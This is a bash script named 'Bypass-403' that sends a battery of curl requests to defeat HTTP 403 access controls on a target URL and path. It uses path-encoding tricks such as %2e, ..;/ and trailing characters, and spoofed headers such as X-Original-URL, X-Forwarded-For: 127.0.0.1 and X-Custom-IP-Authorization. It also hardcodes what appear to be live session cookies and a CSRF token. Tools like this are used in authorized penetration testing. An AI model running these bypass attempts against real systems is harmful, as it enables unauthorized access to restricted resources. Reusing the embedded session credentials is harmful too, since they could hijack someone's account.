#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "

# Define cookies
cookies="perf_dv6Tr4n=1; logged_in=true; _set_expires=true; _core_session_id=a5c9b3340a85c03e1bdc783a55387f245ab017065d1e3bbb1f5f450d19eb8b86; socrata-csrf-token=BNbCZmbOMaO+Yrf4bPBpn5dNfQnRFy/8e+Mwa1gsJ9Vud2f+ho6OdIy/AD3YsiGrBADZiw3A1HlmcgN7Wn8ubw==; _frontend_session=VldRMmNmN3N2bnJ5VDBxVVlINWV4eXlpMmV6Mkpjbyt1Mll6dkNhZVdORjVZNDAwaG5yUWNnTEg4LzlpRzVwZkVRYUFxTXZIZFlsZktqQ0tnc3pLUmhRSlAreUw2WmtCUDU3WFdlUUxtYUZDbjlxSk5mVnVKWUVXRExHSnJFNEJaeFJLcDRXa1dxU2ZGM1A4blJLM1BSbmNFeDlFQVAwait1S05iZjJqSkxHd0ZQZXBrOW1td0oxeEdVZkpJbDMyc3ZtalJFd0loMlQyRnpTRXBWRHduOC9FeXpjOG9FQVYzQ0RBTThzQy8vMlZHUUd2NkRFZFJRU05yeC8xRGlWU0wzaGxzUWt1dXhncWVsZldYQm5JMTk4ZGlmdTN6SzYzV0pwUGoxbzkyQzN3bEM3bllLRkxFUlNpWWVFbjBGTkEtLUZnUmFXbGpzT2lLK2ZkQ3BZSG1lMWc9PQ%3D%3D--db52aca91f76c3b88a136963b56932324a7425d7"

# Add cookies to each curl command
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" -b "$cookies" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" -b "$cookies" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" -b "$cookies" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" -b "$cookies" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" -b "$cookies" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST -b "$cookies" $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE -b "$cookies" $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" -b "$cookies" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -b "$cookies" " $1/$2;/"
echo "  --> ${1}/${2};/"
#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE -b "$cookies" $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" -b "$cookies" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 -b "$cookies" | jq -r '.archived_snapshots.closest | {available, url}'
